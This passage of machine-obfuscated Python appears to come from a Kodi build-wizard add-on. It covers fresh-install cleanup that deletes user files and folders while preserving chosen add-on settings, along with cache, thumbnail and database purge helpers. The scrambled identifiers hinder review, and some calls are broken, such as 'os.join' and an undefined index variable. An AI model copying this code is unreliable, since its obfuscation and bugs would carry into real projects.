				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'skin.anonymous.mod'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4942
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'skin.Premium.mod'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4943
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'skin.anonymous.nox'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4944
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'skin.phenomenal'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4945
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.metalliq'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4946
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'skin.titan'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4948
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'pvr.iptvsimple'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4949
				elif OO0OO00OOOO00O00O =='sources.xml'and O0000O0OOO00O00OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4951
				elif OO0OO00OOOO00O00O =='quicknav.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4954
				elif OO0OO00OOOO00O00O =='x1101.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4955
				elif OO0OO00OOOO00O00O =='b-srtym-b.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4956
				elif OO0OO00OOOO00O00O =='x1102.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4957
				elif OO0OO00OOOO00O00O =='b-sdrvt-b.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4958
				elif OO0OO00OOOO00O00O =='x1112.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4959
				elif OO0OO00OOOO00O00O =='b-tlvvyzyh-b.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4960
				elif OO0OO00OOOO00O00O =='x1111.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4961
				elif OO0OO00OOOO00O00O =='b-tvknyshrly-b.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4962
				elif OO0OO00OOOO00O00O =='x1110.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4963
				elif OO0OO00OOOO00O00O =='b-yldym-b.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4964
				elif OO0OO00OOOO00O00O =='x1114.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4965
				elif OO0OO00OOOO00O00O =='b-mvzyqh-b.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4966
				elif OO0OO00OOOO00O00O =='mainmenu.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4967
				elif OO0OO00OOOO00O00O =='skin.Premium.mod.properties'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4968
				elif OO0OO00OOOO00O00O =='x1122.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4970
				elif OO0OO00OOOO00O00O =='b-spvrt-b.DATA.xml'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4971
				elif OO0OO00OOOO00O00O =='favourites.xml'and O0000O0OOO00O00OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4976
				elif OO0OO00OOOO00O00O =='guisettings.xml'and O0000O0OOO00O00OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4978
				elif OO0OO00OOOO00O00O =='profiles.xml'and O0000O0OOO00O00OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4979
				elif OO0OO00OOOO00O00O =='advancedsettings.xml'and O0000O0OOO00O00OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4980
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4981
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'program.apollo'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4982
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4983
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.telemedia'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4984
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.elementum'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4987
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4989
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'weather.yahoo'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4990
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.quasar'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4991
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'program.apollo'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4992
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4993
				elif O0000O0OOO00O00OO [O0O000O0O0O0O00OO -2 ]=='userdata'and O0000O0OOO00O00OO [O0O000O0O0O0O00OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0000O0OOO00O00OO [O0O000O0O0O0O00OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:4994
				elif OO0OO00OOOO00O00O in LOGFILES :wiz .log ("Keep Log File: %s"%OO0OO00OOOO00O00O ,xbmc .LOGNOTICE )#line:4995
				elif OO0OO00OOOO00O00O .endswith ('.db'):#line:4996
					try :#line:4997
						if OO0OO00OOOO00O00O ==OOO00OO0OOO0OO0OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO0OO00OOOO00O00O ,KODIV ),xbmc .LOGNOTICE )#line:4998
						else :os .remove (os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ))#line:4999
					except Exception as O00O00000O0000O00 :#line:5000
						if not OO0OO00OOOO00O00O .startswith ('Textures13'):#line:5001
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5002
							wiz .log ("-> %s"%(str (O00O00000O0000O00 )),xbmc .LOGNOTICE )#line:5003
							wiz .purgeDb (os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ))#line:5004
				else :#line:5005
					DP .update (int (wiz .percentage (O00OO0OOO0OO0OO00 ,O00OO000OO000O0O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO00OOOO00O00O ),'')#line:5006
					try :os .remove (os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ))#line:5007
					except Exception as O00O00000O0000O00 :#line:5008
						wiz .log ("Error removing %s"%os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),xbmc .LOGNOTICE )#line:5009
						wiz .log ("-> / %s"%(str (O00O00000O0000O00 )),xbmc .LOGNOTICE )#line:5010
			if DP .iscanceled ():#line:5011
				DP .close ()#line:5012
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5013
				return False #line:5014
		for O00O0OO000O0OO0O0 ,O00000OO00OOOOO00 ,O0000O00OOOOO0000 in os .walk (O0O00000O0O0OOOOO ,topdown =True ):#line:5015
			O00000OO00OOOOO00 [:]=[O000O0O00OOOO0OOO for O000O0O00OOOO0OOO in O00000OO00OOOOO00 if O000O0O00OOOO0OOO not in EXCLUDES ]#line:5016
			for OO0OO00OOOO00O00O in O00000OO00OOOOO00 :#line:5017
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO00OOOO00O00O ),'')#line:5018
			  if OO0OO00OOOO00O00O not in ["Database","userdata","temp","addons","addon_data"]:#line:5019
			   if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5020
			    if not (OO0OO00OOOO00O00O =='skin.titan'and KEEPSKIN3 =='true'):#line:5022
			      if not (OO0OO00OOOO00O00O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5023
			       if not (OO0OO00OOOO00O00O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5024
			        if not (OO0OO00OOOO00O00O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5025
			         if not (OO0OO00OOOO00O00O =='program.apollo'and KEEPINFO =='true'):#line:5026
			          if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5027
			           if not (OO0OO00OOOO00O00O =='weather.yahoo'and KEEPWEATHER =='true'):#line:5028
			            if not (OO0OO00OOOO00O00O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5029
			             if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5030
			              if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5031
			               if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5032
			                if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5033
			                 if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5034
			                  if not (OO0OO00OOOO00O00O =='plugin.video.neptune'and KEEPINFO =='true'):#line:5035
			                   if not (OO0OO00OOOO00O00O =='plugin.video.youtube'and KEEPINFO =='true'):#line:5036
			                    if not (OO0OO00OOOO00O00O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5037
			                     if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5038
			                      if not (OO0OO00OOOO00O00O =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5039
			                       if not (OO0OO00OOOO00O00O =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5040
			                           if not (OO0OO00OOOO00O00O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5044
			                            if not (OO0OO00OOOO00O00O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5045
			                             if not (OO0OO00OOOO00O00O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5046
			                              if not (OO0OO00OOOO00O00O =='plugin.video.quasar'and KEEPINFO =='true'):#line:5047
			                               if not (OO0OO00OOOO00O00O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5048
			                                  shutil .rmtree (os .path .join (O00O0OO000O0OO0O0 ,OO0OO00OOOO00O00O ),ignore_errors =True ,onerror =None )#line:5050
			if DP .iscanceled ():#line:5051
				DP .close ()#line:5052
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5053
				return False #line:5054
		DP .close ()#line:5055
		wiz .clearS ('build')#line:5056
		if over ==True :#line:5057
			return True #line:5058
		elif install =='restore':#line:5059
			return True #line:5060
		elif install :#line:5061
			buildWizard (install ,'normal',over =True )#line:5062
		else :#line:5063
			if INSTALLMETHOD ==1 :OO00OO0O000OOO0OO =1 #line:5064
			elif INSTALLMETHOD ==2 :OO00OO0O000OOO0OO =0 #line:5065
			else :OO00OO0O000OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5066
			if OO00OO0O000OOO0OO ==1 :wiz .reloadFix ('fresh')#line:5067
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5068
	else :#line:5069
		if not install =='restore':#line:5070
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5071
			wiz .refresh ()#line:5072
def clearCache ():#line:5077
		wiz .clearCache ()#line:5078
def fixwizard ():#line:5082
		wiz .fixwizard ()#line:5083
def totalClean ():#line:5085
		wiz .clearCache ()#line:5087
		wiz .clearPackages ('total')#line:5088
		clearThumb ('total')#line:5089
		cleanfornewbuild ()#line:5090
def cleanfornewbuild ():#line:5091
		try :#line:5092
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5093
		except :#line:5094
			pass #line:5095
		try :#line:5096
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5097
		except :#line:5098
			pass #line:5099
		try :#line:5100
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5101
		except :#line:5102
			pass #line:5103
def clearThumb (type =None ):#line:5104
	OOOO000OO0O00OO0O =wiz .latestDB ('Textures')#line:5105
	if not type ==None :O0OO0OO0O0OO0O000 =1 #line:5106
	else :O0OO0OO0O0OO0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOOO000OO0O00OO0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5107
	if O0OO0OO0O0OO0O000 ==1 :#line:5108
		try :wiz .removeFile (os .join (DATABASE ,OOOO000OO0O00OO0O ))#line:5109
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOOO000OO0O00OO0O )#line:5110
		wiz .removeFolder (THUMBS )#line:5111
	else :wiz .log ('Clear thumbnames cancelled')#line:5113
	wiz .redoThumbs ()#line:5114
def purgeDb ():#line:5116
	O00O000O0O0OOOOO0 =[];O00OO0O0000OOO0O0 =[]#line:5117
	for OOO0O0OOOO0O0000O ,OO0O00O000000OO00 ,OOO00OO0OO0OOO00O in os .walk (HOME ):#line:5118
		for O00O0OO0000OO00O0 in fnmatch .filter (OOO00OO0OO0OOO00O ,'*.db'):#line:5119
			if O00O0OO0000OO00O0 !='Thumbs.db':#line:5120
				O0OO0O0OO00OOOOO0 =os .path .join (OOO0O0OOOO0O0000O ,O00O0OO0000OO00O0 )#line:5121
				O00O000O0O0OOOOO0 .append (O0OO0O0OO00OOOOO0 )#line:5122
				OO0OOO00O000OOO00 =O0OO0O0OO00OOOOO0 .replace ('\\','/').split ('/')#line:5123
				O00OO0O0000OOO0O0 .append ('(%s) %s'%(OO0OOO00O000OOO00 [len (OO0OOO00O000OOO00 )-2 ],OO0OOO00O000OOO00 [len (OO0OOO00O000OOO00 )-1 ]))#line:5124
	if KODIV >=16 :#line:5125
		O0O00OO0OO0OO0O0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OO0O0000OOO0O0 )#line:5126
		if O0O00OO0OO0OO0O0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5127
		elif len (O0O00OO0OO0OO0O0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5128
		else :#line:5129
			for OO0O0OO00OOOO0O0O in O0O00OO0OO0OO0O0O :wiz .purgeDb (O00O000O0O0OOOOO0 [OO0O0OO00OOOO0O0O ])#line:5130
	else :#line:5131
		O0O00OO0OO0OO0O0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OO0O0000OOO0O0 )#line:5132
		if O0O00OO0OO0OO0O0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5133
		else :wiz .purgeDb (O00O000O0O0OOOOO0 [OO0O0OO00OOOO0O0O ])#line:5134
def fastupdatefirstbuild (OOOO00O0OOOOOO00O ):#line:5140
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5142
	if ENABLE =='Yes':#line:5143
		if not NOTIFY =='true':#line:5144
			OOO0O0OO0OO0O00OO =wiz .workingURL (NOTIFICATION )#line:5145
			if OOO0O0OO0OO0O00OO ==True :#line:5146
				OOO000OO00OO0O00O ,OOOOOO00O0000O000 =wiz .splitNotify (NOTIFICATION )#line:5147
				if not OOO000OO00OO0O00O ==False :#line:5149
					try :#line:5150
						OOO000OO00OO0O00O =int (OOO000OO00OO0O00O );OOOO00O0OOOOOO00O =int (OOOO00O0OOOOOO00O )#line:5151
						checkidupdate ()#line:5152
						wiz .setS ("notedismiss","true")#line:5153
						if OOO000OO00OO0O00O ==OOOO00O0OOOOOO00O :#line:5154
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO000OO00OO0O00O ),xbmc .LOGNOTICE )#line:5155
